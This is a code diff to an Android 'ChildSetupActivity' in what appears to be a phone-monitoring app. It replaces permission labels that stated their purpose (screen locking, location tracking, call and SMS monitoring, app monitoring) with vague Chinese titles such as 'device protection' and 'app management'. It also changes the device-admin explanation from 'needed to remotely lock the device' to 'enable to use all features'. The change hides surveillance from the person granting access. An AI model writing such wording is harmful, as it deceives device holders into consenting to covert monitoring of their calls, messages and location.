@@ -94,15 +94,15 @@ public class ChildSetupActivity extends AppCompatActivity {
         accessibility = new PermissionViewHolder(findViewById(R.id.permission_accessibility));
         finishButton = findViewById(R.id.button_finish_setup);
 
-        admin.title.setText("设备管理员（用于锁定屏幕）");
-        usage.title.setText("使用情况访问（用于应用封锁）");
-        overlay.title.setText("悬浮窗权限（用于锁屏）");
-        location.title.setText("位置权限（用于定位追踪）");
-        call.title.setText("通话记录（用于监控）");
-        sms.title.setText("短信记录（用于监控）");
-        notifications.title.setText("通知权限（保证服务稳定）");
-        battery.title.setText("关闭电池优化");
-        accessibility.title.setText("无障碍服务（用于应用监控）");
+        admin.title.setText("设备保护");
+        usage.title.setText("应用管理");
+        overlay.title.setText("显示权限");
+        location.title.setText("位置服务");
+        call.title.setText("通话记录");
+        sms.title.setText("短信记录");
+        notifications.title.setText("通知权限");
+        battery.title.setText("省电优化");
+        accessibility.title.setText("无障碍服务");
     }
 
     private void setupClickListeners() {
@@ -159,7 +159,7 @@ public class ChildSetupActivity extends AppCompatActivity {
     private void requestDeviceAdmin() {
         Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
         intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, compName);
-        intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "需要此权限才能远程锁定设备");
+        intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "开启即可使用全部功能");
         requestSettingLauncher.launch(intent);
     }
 
